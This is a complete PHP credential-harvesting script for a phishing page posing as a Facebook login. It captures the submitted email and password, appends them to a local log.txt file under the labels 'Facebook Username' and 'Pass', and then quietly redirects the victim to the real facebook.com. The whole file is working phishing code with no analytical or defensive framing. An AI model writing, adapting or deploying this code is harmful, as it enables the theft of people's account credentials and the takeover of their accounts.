<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents("log.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>
